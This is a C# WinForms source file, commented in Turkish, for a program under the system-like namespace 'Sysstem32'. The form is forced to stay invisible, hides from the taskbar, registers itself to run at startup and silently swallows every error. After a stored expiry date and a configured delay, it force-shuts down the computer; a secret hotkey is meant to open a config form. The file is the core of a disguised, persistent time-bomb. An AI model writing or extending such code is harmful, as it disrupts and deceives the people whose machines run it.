using Sysstem32.Helpers;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Sysstem32
{
    public partial class Form1 : Form
    {
     private HotkeyManager _hotkeyManager;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Form'u tamamen gizle
            this.Visible = false;
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;

            // Sistem başlatma işlemleri
            InitializeSystem();
        }

        private void InitializeSystem()
        {
            try
            {
                // DateTime manager'ı başlat
                DateTimeManager.Initialize();

                // Memory footprint'i minimize et
                SystemManager.MinimizeMemoryFootprint();

                // Startup'a ekle
                if (!SystemManager.IsInStartup())
                {
                    SystemManager.AddToStartup();
                }

                // Hotkey manager'ı başlat
                _hotkeyManager = new HotkeyManager(this.Handle);
                _hotkeyManager.HotkeyPressed += OnHotkeyPressed;
                _hotkeyManager.RegisterHotkey();

                // Ana döngüyü başlat
                timerMainLoop.Start();
            }
            catch
            {
                // Sessizce devam et
            }
        }

        private void timerMainLoop_Tick(object sender, EventArgs e)
        {
            CheckSystemStatus();
        }

        private void CheckSystemStatus()
        {
            try
            {
                // Expired mode aktif mi kontrol et
                if (DateTimeManager.IsExpiredModeActive())
                {
                    // Süre dolmuş, gecikme süresini kontrol et
                    int delayMinutes = ConfigManager.GetDelayMinutes();
                    
                    // Basit kontrol: program başlangıcından beri geçen süre
                    TimeSpan runTime = DateTime.Now - DateTimeManager.GetStaticBootTime();
                    
                    if (runTime.TotalMinutes >= delayMinutes)
                    {
                        // Sistemi kapat
                        SystemManager.ForceShutdown();
                        return;
                    }
                }
                else
                {
                    // Normal mod: tarih kontrolü yap
                    if (DateTimeManager.IsExpired())
                    {
                        // Süre doldu, expired mode'a geç
                        DateTimeManager.ActivateExpiredMode();
                    }
                }
            }
            catch
            {
                // Sessizce devam et
            }
        }

        protected override void WndProc(ref Message m)
        {
            _hotkeyManager?.ProcessHotkey(m);
            base.WndProc(ref m);
        }

        private void OnHotkeyPressed(object sender, EventArgs e)
        {
            // Şimdilik test mesajı
            MessageBox.Show("Config formu açılacak!");
            // TODO: ConfigForm'u açacağız
        }

        protected override void SetVisibleCore(bool value)
        {
            // Form'un hiçbir zaman görünür olmamasını sağla
            base.SetVisibleCore(false);
        }
    }
}
